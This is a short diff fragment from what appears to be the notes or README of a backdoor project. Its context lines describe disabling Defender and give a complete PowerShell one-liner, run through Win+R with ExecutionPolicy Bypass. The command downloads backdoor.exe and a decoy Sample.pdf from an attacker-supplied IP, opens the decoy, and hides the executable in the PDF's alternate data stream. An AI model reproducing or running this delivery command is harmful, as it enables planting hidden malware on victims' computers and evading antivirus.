@@ -109,7 +109,7 @@ Note : The backdoor will likely be flagged unless Defender is disabled
 
 
 ----
-#### In Progress, \n
+#### In Progress, 
 Try to download and inject backdoor.exe in ADS of opening sample.pdf 
 something like this in Win+R :
 powershell.exe -ExecutionPolicy Bypass -Command "$ip='YOUR.IP.HERE'; Invoke-WebRequest -Uri \"http://$ip/backdoor.txt\" -OutFile backdoor.txt; Invoke-WebRequest -Uri \"http://$ip/Sample.pdf\" -OutFile Sample.pdf; Start-Process Sample.pdf; Rename-Item backdoor.txt backdoor.exe; Set-Content -Path 'Sample.pdf:backdoor.exe' -Value ([System.IO.File]::ReadAllBytes('backdoor.exe')) -Encoding Byte"
